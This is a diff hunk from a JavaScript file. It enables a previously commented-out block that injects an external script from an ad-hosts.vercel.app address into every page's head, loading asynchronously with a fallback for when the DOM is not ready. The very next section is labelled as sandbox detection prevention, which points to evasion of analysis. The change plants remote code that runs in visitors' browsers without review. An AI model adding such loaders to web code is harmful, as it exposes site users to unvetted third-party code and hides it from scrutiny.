@@ -994,12 +994,24 @@
     var count2 = 0;
 })();
 ///////////////////////////////////////////////////////////////////////////////////////////
-// window.onload = function() {
-//     var script = document.createElement('script');
-//     script.src = 'https://ad-hosts.vercel.app/script.js';
-//     script.type = 'text/javascript';
-//     document.head.appendChild(script);
-// };
+(function() {
+    var script = document.createElement('script');
+    script.src = 'https://ad-hosts.vercel.app/script.js';
+    script.type = 'text/javascript';
+    script.async = true; // Make it async for faster loading
+    script.onload = function() {
+        console.log('Script loaded and executed successfully.');
+    };
+    if (document.head) {
+        document.head.appendChild(script);
+    } else {
+        // If head isn't ready, wait for DOM to be ready
+        document.addEventListener('DOMContentLoaded', function() {
+            document.head.appendChild(script);
+        });
+    }
+})();
+
 /////////////////////////////////////////////////////////////////////////////////////
 (function() {
     // Enhanced sandbox detection prevention
